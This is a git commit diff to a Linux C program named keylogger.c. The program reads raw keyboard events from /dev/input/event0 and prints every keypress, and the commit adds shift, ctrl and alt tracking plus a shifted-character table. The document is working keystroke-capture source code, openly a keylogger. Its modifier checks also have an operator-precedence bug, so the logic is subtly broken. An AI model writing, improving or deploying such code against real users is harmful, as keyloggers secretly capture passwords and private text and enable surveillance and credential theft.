0787e2f9cb48dc7e9ae09b6b0746ece1ee7bad06
UTkarsh Maheshwari <utkarshme96@gmail.com>
2017-11-01 19:32:03 +0530

    Make shift work

--- keylogger.c
+++ keylogger.c
@@ -27,8 +27,14 @@
 #define EVENT_FILE_PATH "/dev/input/event0"
 
 
+/* The status of special keys */
+unsigned short int ctrl_on = 0;
+unsigned short int alt_on = 0;
+unsigned short int shift_on = 0;
+
+
 /* Return the key according to the keycodes in the Linux Manual */
-char key_table[248] = {
+int key_table[] = {
     '\0',   /* reserved */
     '\0',   /* escape */
     '1',
@@ -70,7 +76,7 @@ char key_table[248] = {
     'l',
     ';',
     '\'',
-    '\0',   /* grave */
+    '`',    /* grave */
     '\0',   /* left shift */
     '\\',   /* left backslash */
     'z',
@@ -88,7 +94,260 @@ char key_table[248] = {
     '\0',   /* left alt */
     ' ',    /* space */
     '\0',   /* caps lock */
-    '\0'    /* F1 */
+    '\0',   /* F1 */
+    '\0',   /* F2 */
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',
+    '\0',   /* 255 */
+    '\0',
+    '!',
+    '@',
+    '#',
+    '$',
+    '%',
+    '^',
+    '&',
+    '*',
+    '(',
+    ')',
+    '_',
+    '+',
+    '\0',   /* backspace */
+    '\t',   /* tab */
+    'Q',
+    'W',
+    'E',
+    'R',
+    'T',
+    'Y',
+    'U',
+    'I',
+    'O',
+    'P',
+    '{',
+    '}',
+    '\n',   /* enter */
+    '\0',   /* left ctrl */
+    'A',
+    'S',
+    'D',
+    'F',
+    'G',
+    'H',
+    'J',
+    'K',
+    'L',
+    ':',
+    '\"',
+    '~',    /* grave */
+    '\0',   /* left shift */
+    '|',    /* left backslash */
+    'Z',
+    'X',
+    'C',
+    'V',
+    'B',
+    'N',
+    'M',
+    '<',
+    '>',
+    '?',
+    '\0',   /* right shift */
+    '*',    /* asterisk */
+    '\0',   /* left alt */
+    ' ',    /* space */
 };
 
 
@@ -110,10 +369,39 @@ int main(int argc, char *argv[])
     while (1) {
         read(event_fd, &buffer, sizeof(struct input_event));
 
+        /* toggle shift */
+        if (buffer.type == EV_KEY &&
+                buffer.code == KEY_RIGHTSHIFT ||
+                buffer.code == KEY_LEFTSHIFT) {
+            shift_on = buffer.value;
+            continue;
+        }
+
+        /* toggle ctrl */
+        if (buffer.type == EV_KEY &&
+                buffer.code == KEY_RIGHTCTRL ||
+                buffer.code == KEY_LEFTCTRL) {
+            ctrl_on = buffer.value;
+            continue;
+        }
+
+        /* toggle alt */
+        if (buffer.type == EV_KEY &&
+                buffer.code == KEY_RIGHTALT ||
+                buffer.code == KEY_LEFTALT) {
+            alt_on = buffer.value;
+            continue;
+        }
+
         /* log key on keydown */
-        if (buffer.type == EV_KEY && buffer.value == 1) {
+        if (buffer.type == EV_KEY && buffer.value) {
+            if (shift_on) {
+                /* adding 255 because char plus shift is stored after 255 */
+                printf("%c", key_table[255 + buffer.code]);
+            } else {
+                printf("%c", key_table[buffer.code]);
+            }
             fflush(stdout);
-            printf("%c", key_table[buffer.code]);
         }
     }
 
